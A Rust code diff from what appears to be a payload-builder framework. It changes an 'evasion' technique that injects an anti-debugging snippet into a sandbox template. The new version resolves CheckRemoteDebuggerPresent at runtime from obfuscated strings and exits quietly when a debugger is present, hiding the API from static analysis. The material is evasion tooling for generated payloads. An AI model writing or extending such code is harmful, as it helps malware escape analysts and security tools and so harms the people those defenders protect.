@@ -6,19 +6,23 @@ impl Technique for AntiDebugCheckRemote {
     fn meta(&self) -> &'static TechniqueMeta { &ANTI_DEBUG_CHECK_REMOTE_META }
 
     fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
-        let snippet = r#"fn evasion_anti_debug_check_remote() {
+        let snippet = r#"fn {{FN_EVASION_CHECK_REMOTE}}() {
+    static OBF_MOD: &[u8] = &{{STR_KERNEL32}};
+    static OBF_PROC: &[u8] = &{{STR_CHECK_REMOTE_DBG}};
+    type Fn_ = unsafe extern "system" fn(*mut core::ffi::c_void, *mut i32) -> i32;
     unsafe {
+        let f: Fn_ = match {{FN_RESOLVER}}(OBF_MOD, OBF_PROC) {
+            Some(f) => f,
+            None => return,
+        };
         let mut present: i32 = 0;
-        let _ = winapi::um::debugapi::CheckRemoteDebuggerPresent(
-            winapi::um::processthreadsapi::GetCurrentProcess(),
-            &mut present,
-        );
+        let _ = f(-1isize as *mut core::ffi::c_void, &mut present);
         if present != 0 {
-            winapi::um::processthreadsapi::ExitProcess(0);
+            std::process::exit(0);
         }
     }
 }
-evasion_anti_debug_check_remote();"#;
+{{FN_EVASION_CHECK_REMOTE}}();"#;
         ctx.append_replacement("{{SANDBOX}}", snippet.to_string());
         Ok(())
     }
